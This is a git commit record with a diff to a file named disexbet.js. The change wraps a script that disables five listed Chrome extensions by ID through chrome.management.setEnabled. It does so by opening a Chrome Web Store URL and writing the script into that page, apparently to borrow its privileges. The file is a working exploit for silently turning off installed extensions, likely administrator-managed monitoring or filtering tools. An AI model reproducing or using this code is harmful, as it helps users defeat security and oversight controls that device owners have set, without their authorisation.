61d369c7b870389b6de112219d1456393d6d05a4
Discord <95700058+phillipbruh@users.noreply.github.com>
2022-10-03 10:01:42 -0400

    Update disexbet.js

--- disexbet.js
+++ disexbet.js
@@ -1,5 +1,8 @@
+x = window.open("https://chrome.google.com/webstorex");
+x.document.write('<script>
 const extentions =['icmgjiknkpcfkhgajgmpkkehdjmidlgl','adkcpkpghahmbopkjchobieckeoaoeem','cgbbbjmgdpnifijconhamggjehlamcif','kkbmdgjggcdajckdlbngdjonpchpaiea','dmdmgaepfoakhbmfckjjfilpgmceocgl']
 let disabled = 0
 for( e in extentions ){
     chrome.management.setEnabled(extentions[e], false, ()=>{disabled  })
 }
+</script>');
